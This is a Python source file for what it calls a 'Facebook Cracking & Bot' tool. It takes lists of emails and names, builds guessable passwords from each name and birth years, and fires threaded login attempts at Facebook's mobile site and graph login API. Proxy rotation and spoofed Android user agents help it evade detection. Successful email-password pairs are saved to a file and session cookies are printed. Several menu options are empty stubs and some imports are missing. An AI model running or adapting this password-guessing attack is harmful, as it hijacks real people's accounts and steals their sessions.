import requests, os
key_data = requests.get("https://github.com/RaKhar2000/R-4/blob/main/key.txt").text
user_key = str(os.getlogin()) + str(os.getuid())
if user_key in key_data:
    print("Your Key Approval")
else:
    print("Your Key Not Approval\n")
    print(f"Your Key: {user_key}")
try: import requests
except:
    os.system('pip install requests')
    import requests
try: from bs4 import BeautifulSoup as bs
except:
    os.system('pip install bs4')
    from bs4 import BeautifulSoup as bs

if sys.version_info[0] == 3:
    pass
else:
    sys.exit('update your python version')

proxy_ = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all").text.split()
proxy_list = []
for i in proxy_:
    if not i in proxy_list:
        proxy_list.append(i)

loop = 0
ok = 0
cp = 0
a = "\033[1;30m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
w = "\033[00m"
o = "\x1b[38;5;208m"


zxc = f"""{r}
██████╗ ██╗   ██╗ ██████╗ 
██╔══██╗██║   ██║██╔════╝ 
██████╔╝██║   ██║██║  ███╗
██╔══██╗██║   ██║██║   ██║
██████╔╝╚██████╔╝╚██████╔╝
╚═════╝  ╚═════╝  ╚═════╝

Developer : Ma Ka Sha
Github    : https://github.com/Empty-z
Tool      : Facebok Cracking & Bot 
vsn       : 1.0.0 
"""

def cls():
    os.system("clear")

def logo():
    cls()
    print(zxc)

proxy_limit = int(open('.proxy_limit','r').read().strip())
user_agent_type = str(open(".user_agent_type",'r').read())

def simple():
    x = input("Put File : ")
    try:
        f = open(x,'r').read().splitlines()
        generate_password(f)
    except FileNotFoundError:
        print("File Not Found")
        time.sleep(2)
        return simple()
    
class USER_AGENT():
    def HUAWEI():
        J = random.choice(["7","8","9","10","11","12","13"])
        F = random.choice(["AGS-L09", "HUAWEI VNS-L31", "Nexus 6P", "NEM-L51", "ALE-L21", "MRX-AL09", "PRA-LX1"])
        S = random.choice(["HUAWEIVNS-L31; wv", "OPP3.170518.006", "HONORNEM-L51; wv", "HuaweiALE-L21; wv", "HUAWEIAGS-L09; wv", "HONORNEM-L51", "HUAWEIPRA-LX1"])
        I = f"Mozilla/5.0 (Linux; Android {J}; {F} Build/{S}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(111,333))}.0.{str(random.randint(1111,3333))}.{str(random.randint(111,222))} Safari/537.36"
        return (I, F, J)
    def REDMI():
        J = random.choice(["7","8","9","10","11","12","13"])
        F = random.choice(["Redmi Y3","2209116AG","Redmi 8A","M2105K81C","M2105K81AC","Redmi Y1","2312DRAABC","Redmi X","2109119DG","21091116C","23090RA98C","22101320C","Redmi S2","Redmi Rise","M2101K6G","Redmi Y2","SHARK MBU-H0","M2012K10C","23073RPBFG","23046PNC9C","23046PNC9C","Redmi Y1 Lite","Redmi Pro","Redmi Pad SE","Redmi Pad","Redmi Note9S","Redmi Note9","Redmi Note8T","Redmi Note8","Redmi Note7S","Redmi Note7Pro","Redmi Note7","Redmi Note5","Redmi Note10T","Redmi Note10","Redmi Note10S","Redmi Note Pro","Redmi Note Prime","Redmi Note 9T 5G","Redmi Note 9T","Redmi Note 9S","Redmi Note 95","Redmi Note 9 Pro Max","Redmi Note 9 Pro 5G","Redmi Note 9 Pro","Redmi Note 8T","Redmi Note 9","Redmi Note 8T","Redmi Note 8 Pro","Redmi Note 8","Redmi Note 7S","Redmi Note 7Pro"])
        S = random.choice(["TP1A.220624.014; wv","TKQ1.221114.001; wv","QKQ1.191014.001","TKQ1.221013.002; wv","UP1A.231005.007; wv","TKQ1.220829.002; wv","SKQ1.210908.001; wv","MOBS2208200OS00MR2; wv"])
        I = f"Mozilla/5.0 (Linux; Android {J}; {F} Build/{S}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(111,333))}.0.{str(random.randint(1111,3333))}.{str(random.randint(111,222))} Safari/537.36 [FB_IAB/FB4A;FBAV/44{str(random.randint(5,8))}.0.0.{str(random.randint(11,99))}.{str(random.randint(111,999))};]"
        return (I, F, J)
    
    def return_function():
        huawei = USER_AGENT.HUAWEI()
        redmi = USER_AGENT.REDMI()


def line():
    print("="*45)

class main_menu():
    def __init__(self):
        logo()
        self.menu_a()
    
    def menu_a(self):
        line()
        print("1 : Facebook File Cracking")
        print("2 : Facebook Random Phone_Number Cracking")
        print("3 : Facebook Random Mail Cracking")
        print("4 : Facebook Public ID Cracking")
        print("5 : Facebook ID Dump")
        print("6 : Facebook Public Group Cracking")
        print("7 : Facebook BOT(Coming Soon)")
        print("8 : Facebook BruteForce")
        print("9 : Facebook Account TryHack")
        print("0 : Logout Tool")
        print("X : Contact With Developer")
        print("S : Tool Settings")
        line()
        self.menu_a_input()
        
    def menu_a_input(self):
        zxc = input("Put Feature : ")
        if zxc == "1":
            self.file_crack_menu()
        elif zxc == "2":
            self.random_crack_menu()
        elif zxc == "3":
            self.mail_crack_menu()
        elif zxc == "4":
            self.public_crack_menu()
        elif zxc == "5":
            self.dump_menu()
        elif zxc == "6":
            self.group_crack_menu()
        elif zxc == "7":
            self.bot_menu()
        elif zxc == "8":
            self.bruteforce_menu()
        elif zxc == "9":
            self.tryhack_menu()
        elif zxc == "0":
            self.logout()
        elif zxc in ["x","X"]:
            self.developer()
        elif zxc == "S" or zxc == "s":
            setting()
    
    def file_crack_menu(self):
        line()
        print("1 : Crack with Proxy")
        print("2 : Crack with Normal")
        
        def _put_(x):
            line()
            zxc = input("Put Password Type : ")
            if zxc == "1":
                CRACK_FILE(x,"A")
            elif zxc == "2":
                CRACK_FILE(x, "B")
            elif zxc == "3":
                CRACK_FILE(x, "C")
                
        def type_of_password(x):
            line()
            print("1 : Type of password A")
            print("2 : Type of password B")
            print("3 : Type of password C")
            _put_(x)
            
        def __menu__():
            line()
            zxc = input("Put Feature : ")
            if zxc == "1":
                type_of_password("P")
            elif zxc == "2":
                type_of_password("N")
        __menu__()
        
    
    def random_crack_menu(self):
        pass
    
    def mail_crack_menu(self):
        pass
    
    def public_crack_menu(self):
        pass
    
    def dump_menu(self):
        pass
    
    def group_crack_menu(self):
        pass
    
    def bot_menu(self):
        pass
    
    def bruteforce_menu(self):
        pass
    
    def tryhack_menu(self):
        pass
    
    def logout(self):
        pass
    
    def developer(self):
        pass

class CRACK_FILE():
    def __init__(self, x, p_t):
        self.x = x
        self.pt = p_t
        self.new_proxy = []
        self.FILE()
        
        
    def FILE(self):
        line()
        file = input("Put Dump File Location : ")
        try:
            x = open(file, 'r').read().splitlines()
            if self.x == "P":
                self.proxy_submit(True, x)
            elif self.x == "N":
                self.Manual(False, x)
        except FileNotFoundError:
            print("Not Found File")
            time.sleep(2)
            return self.FILE()
            
    def check_proxy_file(self):
        try:
            pro = open(".p",'r').read().splitlines()
            os.remove(".p")
            return pro
        except FileNotFoundError:
            return None
    
    socket.setdefaulttimeout(60)
    def proxy_check(self, pip):
        handler = urllib.request.ProxyHandler({"http":pip})
        opener = urllib.request.build_opener(handler)
        try:
            opener.open("https://m.facebook.com/login/device-based/regular/login/")
            self.new_proxy.append(pip)
            open(".p",'a').write(pip+"\n")
            sys.stdout.write(f"\r{len(self.new_proxy)} setup proxy {pip} please wait!")
            sys.stdout.flush()
        except Exception as e:
            pass
    
    def proxy_submit(self, z, x):
        line()
        pro = self.check_proxy_file()
        if pro is not None:
            nm = input("Do you want to pass to checking proxy[y/n]: ")
            if nm == "n" or nm == "N":
                line()
                threads = []
                for proxy in pro:
                    thread = threading.Thread( target=self.proxy_check, args=(proxy.strip(), ))
                    thread.start()
                    threads.append(thread)
                for thread in threads:
                    thread.join()
                if len(self.new_proxy) < proxy_limit:
                    threads = []
                    for proxy in proxy_list:
                        thread = threading.Thread( target=self.proxy_check, args=(proxy.strip(), ))
                        thread.start()
                        threads.append(thread)
                    for thread in threads:
                        thread.join()
                    print("\r")
                    self.Manual(z, x)
                else:
                    print("\r")
                    self.Manual(z, x)
            elif nm == "y" or nm == "Y":
                for i in pro:
                    self.new_proxy.append(i)
                    open(".p",'a').write(i+"\n")
                self.Manual(z, x)
        else:
            threads = []
            for proxy in proxy_list:
                thread = threading.Thread( target=self.proxy_check, args=(proxy.strip(), ))
                thread.start()
                threads.append(thread)
            for thread in threads:
               thread.join()
            print("\r")
            self.Manual(z, x)
            
    
    def Manual(self, z, x):
        line()
        print("1 : API")
        print("2 : m.facebook.com")
        line()
        method = input("Put Login type : ")
        if self.pt == "A":
            if method == "1":
                self.Thread_A(z, x, "api")
            elif method == "2":
                self.Thread_A(z, x, "mfb")
        elif self.pt == "B":
            if method == "1":
                self.Thread_B(z, x, "api")
            elif method == "2":
                self.Thread_B(z, x, "mfb")
        elif self.pt == "C":
            if method == "1":
                self.Thread_C(z, x, "api")
            elif method == "2":
                self.Thread_C(z, x, "mfb")
                
    def Thread_A(self, z, file, mth):
        logo()
        with Th(max_workers=50) as mx:
            for i in file:
                email, nam = i.split("|")
                name = nam.lower()
                fas = name.split(" ")[0]
                try:
                    sec = name.split(" ")[1]
                except:
                    sec = ""
                pwd = []
                pwd.append(name)
                pwd.append(nam)
                pwd.append(name + "12345")
                pwd.append(name + "1234")
                pwd.append(name + "123")
                pwd.append(fas + fas)
                pwd.append(fas + "2005")
                pwd.append(fas + "2004")
                pwd.append(fas + "2003")
                pwd.append(fas + "2002")
                pwd.append(fas + "2001")
                pwd.append(fas + "2000")
                pwd.append(fas + "12345")
                pwd.append(fas + "1234")
                pwd.append(fas + "123")
                pwd.append(name.replace(" ",""))
                pwd.append(fas + sec)
                if z:
                    if mth == "api":
                        mx.submit(Login_Facebook.Login_Proxy_API, email, pwd, len(file), random.choice(self.new_proxy))
                    elif mth == "mfb":
                        mx.submit(Login_Facebook.Login_Proxy_MFB, email, pwd, len(file), random.choice(self.new_proxy))
                else:
                    if mth == "api":
                        mx.submit(Login_Facebook.Login_Normal_API, email, pwd, len(file))
                    elif mth == "mfb":
                        mx.submit(Login_Facebook.Login_Normal_MFB, email, pwd, len(file))
               
    def Thread_B(self, z, file, mth):
        logo()
        with Th(max_workers=50) as mx:
            for i in file:
                email, nam = i.split("|")
                name = nam.lower()
                fas = name.split(" ")[0]
                try:
                    sec = name.split(" ")[1]
                except:
                    sec = ""
                pwd = []
                pwd.append(nam)
                pwd.append(name + "1234")
                pwd.append(name + "123")
                pwd.append(fas + "2005")
                pwd.append(fas + "2004")
                pwd.append(fas + "2003")
                pwd.append(fas + "2002")
                pwd.append(fas + "2001")
                pwd.append(fas + "2000")
                pwd.append(fas + "1234")
                pwd.append(fas + "123")
                pwd.append(name.replace(" ",""))
                pwd.append(name.replace(" ","") + "12345")
                pwd.append(name.replace(" ","") + "1234")
                pwd.append(name.replace(" ","") + "123")
                pwd.append(name.replace(" ","") + "2005")
                pwd.append(name.replace(" ","") + "2003")
                pwd.append(name.replace(" ","") + "2000")
                pwd.append(fas + sec)
                if z:
                    if mth == "api":
                        mx.submit(Login_Facebook.Login_Proxy_API, email, pwd, len(file), random.choice(self.new_proxy))
                    elif mth == "mfb":
                        mx.submit(Login_Facebook.Login_Proxy_MFB, email, pwd, len(file), random.choice(self.new_proxy))
                else:
                    if mth == "api":
                        mx.submit(Login_Facebook.Login_Normal_API, email, pwd, len(file))
                    elif mth == "mfb":
                        mx.submit(Login_Facebook.Login_Normal_MFB, email, pwd, len(file))
                    
    def Thread_C(self, z, file, mth):
        logo()
        with Th(max_workers=50) as mx:
            for i in file:
                email, nam = i.split("|")
                name = nam.lower()
                fas = name.split(" ")[0]
                try:
                    sec = name.split(" ")[1]
                except:
                    sec = ""
                pwd = []
                pwd.append(nam)
                pwd.append(name + "1234")
                pwd.append(name + "123")
                pwd.append(fas + "2005")
                pwd.append(fas + "2006")
                pwd.append(fas + "2007")
                pwd.append(fas + "2008")
                pwd.append(fas + "2009")
                pwd.append(fas + "1234")
                pwd.append(fas + "123")
                pwd.append(name.replace(" ",""))
                pwd.append(name.replace(" ","") + "12345")
                pwd.append(name.replace(" ","") + "1234")
                pwd.append(name.replace(" ","") + "123")
                pwd.append(fas + sec)
                pwd.append(fas + sec + "123")
                pwd.append(fas + sec + "1234")
                pwd.append(fas + sec + "12345")
                pwd.append(fas + sec + "2005")
                pwd.append(fas + sec + "2003")
                pwd.append(fas + sec + "2000")
                if z:
                    if mth == "api":
                        mx.submit(Login_Facebook.Login_Proxy_API, email, pwd, len(file), random.choice(self.new_proxy))
                    elif mth == "mfb":
                        mx.submit(Login_Facebook.Login_Proxy_MFB, email, pwd, len(file), random.choice(self.new_proxy))
                else:
                    if mth == "api":
                        mx.submit(Login_Facebook.Login_Normal_API, email, pwd, len(file))
                    elif mth == "mfb":
                        mx.submit(Login_Facebook.Login_Normal_MFB, email, pwd, len(file))
                    
class Login_Facebook():
    def Login_Proxy_MFB(email, pwd, total, proxy):
        global loop, ok, cp
        ses = requests.Session()
        try:
            sys.stdout.write(f"\r{g}[BUG{r}-{g}FB]{w} {loop}|{total}{g}|OK|{ok}|{o}CP|{cp}")
            sys.stdout.flush()
            for pas in pwd:
                x = ses.get('https://m.facebook.com').text
                cg = bs(x, 'html.parser')
                headers = {
                    'authority': 'm.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-MM,en;q=0.9,my-MM;q=0.8,my;q=0.7,en-GB;q=0.6,en-US;q=0.5',
                    'cache-control': 'no-cache',
                    'dpr': '2',
                    'pragma': 'no-cache',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-model': '"{0}"'.format(USER_AGENT.REDMI()[1]),
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua-platform-version': '"{0}.0.0"'.format(USER_AGENT.REDMI()[2]),
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': USER_AGENT.REDMI()[0],
                    'viewport-width': '980',
                }
                data = {
                    "lsd":cg.find("input", {"name":"lsd"})["value"],
                    "jazoest":cg.find("input", {"name":"jazoest"})["value"],
                    "m_ts":cg.find("input", {"name":"m_ts"})["value"],
                    "li":cg.find("input", {"name":"li"})["value"],
                    "try_number":cg.find("input", {"name":"try_number"})["value"],
                    "unrecognized_tries":cg.find("input", {"name":"unrecognized_tries"})["value"],
                    "email":email,
                    "pass":pas,
                    "bi_xrwh":cg.find("input", {"name":"bi_xrwh"})["value"],
                    "_fb_noscript":cg.find("input", {"name":"_fb_noscript"})["value"],
                    "login":"submit"
                }
                s = ses.post("https://m.facebook.com/login/device-based/regular/login/", data=data, headers=headers, proxies={"http":"http://"+proxy}, allow_redirects=True)
                if "c_user" in ses.cookies.get_dict():
                    ok +=1
                    cookie = ";".join([key + "=" + value for key,value in ses.cookies.get_dict().items()])
                    print(f"\r{w}[OK] {g}{email} {w}|{g} {pas}\r")
                    print(f"\r{g}[COOKIE] {w}{cookie}\r")
                    open("ok",'a').write(email+" | "+pas+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    cp +=1
                    print(f"\r{o}[cp] {email} | {pas}\r")
                    open("cp",'a').write(email+" | "+pas+"\n")
                    break
                else:
                    continue
            loop +=1
        except requests.exceptions.ConnectionError:
            time.sleep(5)
    
    def Login_Proxy_API(email, pwd, total, proxy):
        global loop, ok, cp
        ses = requests.Session()
        try:
            sys.stdout.write(f"\r{g}[BUG{r}-{g}FB]{w} {loop}|{total}{g}|OK|{ok}|{o}CP|{cp}")
            sys.stdout.flush()
            for pas in pwd:
                headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent":USER_AGENT.REDMI()[0] ,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":email,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                response = ses.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, proxies={"http":"http://"+proxy}, allow_redirects=False).text
                session = json.loads(response)
                if "session_key" in session:
                    ok +=1
                    items = ";".join(i["name"]+"="+i["value"] for i in session["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={sb};{items}"
                    print(f"\r{w}[OK] {g}{email} {w}|{g} {pas}\r")
                    print(f"\r{g}[COOKIE] {w}{cookie}\r")
                    open("ok",'a').write(email+" | "+pas+"\n")
                    break
                elif "www.facebook.com" in session["error"]["message"]:
                    cp +=1
                    print(f"\r{o}[cp] {email} | {pas}\r")
                    open("cp",'a').write(email+" | "+pas+"\n")
                    break
                else:
                    continue
            loop +=1
        except requests.exceptions.ConnectionError:
            time.sleep(5)
        
    
    def Login_Normal_MFB(email, pwd, total):
        global loop, ok, cp
        ses = requests.Session()
        try:
            sys.stdout.write(f"\r{g}[BUG{r}-{g}FB]{w} {loop}|{total}{g}|OK|{ok}|{o}CP|{cp}")
            sys.stdout.flush()
            for pas in pwd:
                x = ses.get('https://m.facebook.com').text
                cg = bs(x, 'html.parser')
                headers = {
                    'authority': 'm.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-MM,en;q=0.9,my-MM;q=0.8,my;q=0.7,en-GB;q=0.6,en-US;q=0.5',
                    'cache-control': 'no-cache',
                    'dpr': '2',
                    'pragma': 'no-cache',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-model': '"{0}"'.format(USER_AGENT.REDMI()[1]),
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua-platform-version': '"{0}.0.0"'.format(USER_AGENT.REDMI()[2]),
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': USER_AGENT.REDMI()[0],
                    'viewport-width': '980',
                }
                data = {
                    "lsd":cg.find("input", {"name":"lsd"})["value"],
                    "jazoest":cg.find("input", {"name":"jazoest"})["value"],
                    "m_ts":cg.find("input", {"name":"m_ts"})["value"],
                    "li":cg.find("input", {"name":"li"})["value"],
                    "try_number":cg.find("input", {"name":"try_number"})["value"],
                    "unrecognized_tries":cg.find("input", {"name":"unrecognized_tries"})["value"],
                    "email":email,
                    "pass":pas,
                    "bi_xrwh":cg.find("input", {"name":"bi_xrwh"})["value"],
                    "_fb_noscript":cg.find("input", {"name":"_fb_noscript"})["value"],
                    "login":"submit"
                }
                pos = ses.post("https://m.facebook.com/login/device-based/regular/login/", data=data, headers=headers, allow_redirects=True)
                if "c_user" in ses.cookies.get_dict():
                    ok +=1
                    cookie = ";".join([key + "=" + value for key,value in ses.cookies.get_dict().items()])
                    print(f"\r{w}[OK] {g}{email} {w}|{g} {pas}\r")
                    print(f"\r{g}[COOKIE] {w}{cookie}\r")
                    open("ok",'a').write(email+" | "+pas+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    cp +=1
                    print(f"\r{o}[cp] {email} | {pas}\r")
                    open("cp",'a').write(email+" | "+pas+"\n")
                    break
                else:
                    continue
            loop +=1
        except requests.exceptions.ConnectionError:
            time.sleep(5)
    
    def Login_Normal_API(email, pwd, total):
        global loop, ok, cp
        ses = requests.Session()
        try:
            sys.stdout.write(f"\r{g}[BUG{r}-{g}FB]{w} {loop}|{total}{g}|OK|{ok}|{o}CP|{cp}")
            sys.stdout.flush()
            for pas in pwd:
                headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent":USER_AGENT.REDMI()[0] ,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":email,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                response = ses.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).text
                session = json.loads(response)
                if "session_key" in session:
                    ok +=1
                    items = ";".join(i["name"]+"="+i["value"] for i in session["session_cookies"])
                    sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={sb};{items}"
                    print(f"\r{w}[OK] {g}{email} {w}|{g} {pas}\r")
                    print(f"\r{g}[COOKIE] {w}{cookie}\r")
                    open("ok",'a').write(email+" | "+pas+"\n")
                    break
                elif "www.facebook.com" in session["error"]["message"]:
                    cp +=1
                    print(f"\r{o}[cp] {email} | {pas}\r")
                    open("cp",'a').write(email+" | "+pas+"\n")
                    break
                else:
                    continue
            loop +=1
        except requests.exceptions.ConnectionError:
            time.sleep(5)
    
    
    
    
    
class setting():
    def __init__(self):
        logo()
        line()
        print("1 : Proxy Limit Setting (Default - 300)")
        print("2 : User-Agents Setting (Default - Multiple) ")
        line()
        self.FFF()
    
    def FFF(self):
        zxc = input("PUT : ")
        if zxc == "1":
            self.proxy_change()
        elif zxc == "2":
            self.useragent()
    
    def proxy_change(self):
        line()
        xc = input("Put Proxy Limit : ")
        if int(xc) < 50:
            line()
            print("Your Proxy Limit is too low")
            self.proxy_change()
        else:
            open(".proxy_limit",'w').write(xc)
            main_menu()
            
    def useragent(self):
        logo()
        line()
        print("1 : XIAOMI & REDMI USER-AGENT")
        print("2 : MULTIPLE (Default)")
        print("3 : SAMSUNG USER-AGENT")
        print("4 : I-PHONE USER-AGENT")
        print("5 : INFINIX USER-AGENT")
        print("6 : HUAWEI USER-AGENT")
        print("7 : OPPO USER-AGENT")
        print("8 : VIVO USER-AGENT")
        line()
        self.change()
    
    def change(self):
        x = input("Put user-agent type : ")
        if x == "1":
            open(".user_agent_type",'w').write("XRD")
        elif x == "2":
            open(".user_agent_type",'w').write("df")
        elif x == "3":
            open(".user_agent_type",'w').write("SMG")
        elif x == "4":
            open(".user_agent_type",'w').write("IOS")
        elif x == "5":
            open(".user_agent_type",'w').write("INF")
        elif x == "6":
            open(".user_agent_type",'w').write("HUA")
        
        elif x == "7":
            open(".user_agent_type",'w').write("OPO")
        elif x == "8":
            open(".user_agent_type",'w').write("VIO")
        main_menu()
        
        
    


if __name__ == "__main__":
    main_menu()
